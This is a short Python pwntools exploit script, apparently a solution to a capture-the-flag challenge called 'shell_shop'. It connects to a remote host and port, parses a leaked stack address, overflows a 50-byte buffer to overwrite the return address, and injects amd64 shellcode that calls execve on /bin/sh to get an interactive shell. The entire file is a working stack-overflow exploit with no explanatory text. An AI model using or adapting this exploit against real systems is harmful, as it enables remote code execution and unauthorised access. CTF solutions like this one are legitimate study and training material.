from pwn import *

context.clear(arch='amd64', terminal=['tmux', 'splitw', '-fh'])

gdbscript = '''b *main+366
c
'''

#p = process("./shell_shop")
#p = gdb.debug("./shell_shop", gdbscript=gdbscript)
p = remote('94.237.63.166', 47830)

p.sendline(b'2')

sleep(1)
p.clean()

p.sendline(b'3')

leak = int(p.recvuntil(b']').decode().split('Here is a discount code for your next purchase: [')[1][:-1:], 16)

print(leak)

payload  = b'A' * 50		# buf
payload += p64(0x1)		# rbp

payload += p64(leak + 0x40)	# ret addr, continue to shell code

payload += asm("""
	xor rsi, rsi
	xor rdx, rdx
 	mov rax, 0x3b
	mov rbx, 0x0068732f6e69622f
	push rbx
	mov rdi, rsp
	syscall
""")

p.sendline(payload)

p.interactive()
